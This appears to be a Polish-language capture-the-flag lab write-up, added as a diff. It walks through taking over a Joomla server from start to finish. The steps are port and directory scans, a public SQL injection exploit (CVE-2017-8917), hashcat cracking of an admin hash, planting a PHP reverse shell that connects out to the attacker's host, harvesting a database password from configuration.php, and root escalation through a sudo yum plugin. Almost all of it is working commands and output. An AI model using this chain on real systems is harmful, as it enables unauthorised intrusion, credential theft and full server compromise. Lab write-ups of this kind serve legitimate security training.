@@ -1,0 +1,223 @@
+Joomla
+
+*Enumeracja*
+```python
+nmap -sC -sV -A 10.10.250.171
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
+|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
+|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (EdDSA)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+|_http-generator: Joomla! - Open Source Content Management
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+|_http-title: Home
+3306/tcp open  mysql   MariaDB (unauthorized)
+MAC Address: 02:40:BB:FE:BA:57 (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=2/22%OT=22%CT=1%CU=44450%PV=Y%DS=1%DC=D%G=Y%M=0240BB%T
+OS:M=63F5B8A8%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%TS=A)SEQ(
+OS:SP=100%GCD=1%ISR=10A%TI=Z%CI=I%TS=A)OPS(O1=M2301ST11NW6%O2=M2301ST11NW6%
+OS:O3=M2301NNT11NW6%O4=M2301ST11NW6%O5=M2301ST11NW6%O6=M2301ST11)WIN(W1=68D
+OS:F%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M23
+OS:01NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
+OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
+OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%
+OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%R
+OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)IE(R=N)
+
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.39 ms ip-10-10-250-171.eu-west-1.compute.internal (10.10.250.171)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 38.97 seconds
+```
+
+*Otwarte porty*
+```python
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+
+3306/tcp open  mysql   MariaDB (unauthorized)
+```
+
+*Strona internetowa*
+```python
+http://10.10.250.171
+```
+
+*Gobuster*
+```python
+gobuster dir -u http://10.10.250.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+===============================================================
+2023/02/22 06:39:21 Starting gobuster
+===============================================================
+/images (Status: 301)
+/media (Status: 301)
+/templates (Status: 301)
+/modules (Status: 301)
+/bin (Status: 301)
+/plugins (Status: 301)
+/includes (Status: 301)
+/language (Status: 301)
+/components (Status: 301)
+/cache (Status: 301)
+/libraries (Status: 301)
+/tmp (Status: 301)
+/layouts (Status: 301)
+/administrator (Status: 301)
+/cli (Status: 301)
+===============================================================
+2023/02/22 06:39:49 Finished
+===============================================================
+
+```
+
+*Strona internetowa*
+```python
+http://10.10.250.171/robots.txt/
+```
+
+*Wyszukanie wersji Joomla*
+```python
+Strona internetowa:
+ctrl + U
+
+Jesli to nie zadziała w terminalu wpisać:
+
+git clone https://github.com/h44z/joomla_check.git
+
+Źródło:
+https://github.com/h44z/joomla_check
+```
+
+
+*Wyszukanie exploita dla joomla*
+```python
+Źródło:
+https://github.com/brianwrf/Joomla3.7-SQLi-CVE-2017-8917
+
+git clone https://github.com/brianwrf/Joomla3.7-SQLi-CVE-2017-8917.git
+
+python3 joomlah.py http://10.10.250.171/
+```
+![[Pasted image 20230222080349.png]]
+```python
+https://hashcat.net/wiki/doku.php?id=example_hashes
+```
+*Stworzenie pliku z hasem*
+```python
+vim hash.txt
+$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
+```
+*Hashcat*
+```python
+hashcat -a 0 -m 3200 hash.txt /home/kali/Desktop/Hacking/workspace/Zadania/rockyou.txt --force --show
+```
+**Hasło: Spiderman123**
+
+*Strona internetowa*
+```python
+http://10.10.250.171/administrator/
+
+login: jonah
+password: Spiderman123
+
+```
+
+*Reverse shell*
+```python
+Extensions
+Templates
+Beez3 Details and Files
+index.php
+
+Edycja pliku index.php
+Zastąpić plik:
+
+php -r '$sock=fsockopen("10.14.32.12",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+*Netcat*
+```python
+nc -nvlp 9001
+```
+
+*Strona internetowa*
+```python
+http://10.10.250.171/templates/beez3/index.php
+```
+
+*Uzyskano dostęp*
+```python
+cd /var/www/html
+ls -al
+cat configuration.php
+Wyszukać password
+nv5uz9r3ZEDzVjNu
+exit
+```
+
+*Połączcenie SSH*
+```python
+ssh jjameson@10.10.250.171
+password: nv5uz9r3ZEDzVjNu
+
+cat user.txt
+```
+
+*Priviledge escalation*
+```python
+sudo -l
+
+https://gtfobins.github.io/gtfobins/yum/
+
+TF=$(mktemp -d)
+
+cat >$TF/x<<EOF
+
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf<<EOF
+
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py<<EOF
+
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y
+
+sudo -l
+sudo su
+
+```
+
+*Mam roota !!!*
+```python
+cat /root/root.txt
+```
